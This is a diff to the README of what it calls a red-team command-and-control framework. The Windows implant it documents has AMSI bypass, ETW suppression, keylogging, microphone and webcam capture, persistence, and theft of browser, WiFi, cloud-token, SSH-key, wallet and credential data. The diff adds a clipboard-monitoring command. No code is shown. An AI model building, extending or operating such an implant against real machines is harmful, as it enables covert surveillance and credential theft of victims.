@@ -2,7 +2,7 @@
 
 > Red-team C2 framework: Windows-implant agent (WebSocket-over-TLS,
 > AES-256-GCM session crypto, HMAC-SHA-256 registration, AMSI bypass,
-> ETW suppression, keylogger, mic capture, webcam capture, registry + scheduled-task persistence,
+> ETW suppression, keylogger, mic capture, webcam capture, clipboard monitor, registry + scheduled-task persistence,
 > screenshot, process list, clipboard, file search, browser / WiFi /
 > cloud-token / SSH-key exfil, EDR/AV recon, Telegram backup channel,
 > exfil) and a multi-agent operator console.
@@ -228,6 +228,8 @@ Commands:
   mic/m <id> [seconds]           - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav
   listen <id>                    - start live mic stream -> downloads/mic_live_<ts>.wav (open in ffplay/vlc)
   unlisten <id>                  - stop live mic stream and finalize file
+  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt
+  unclipwatch <id>               - stop clipboard monitor
   persist/p <id>                 - re-establish persistence
   exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds
   recon <id> <kind>              - edr|shares|software|usb|tasks
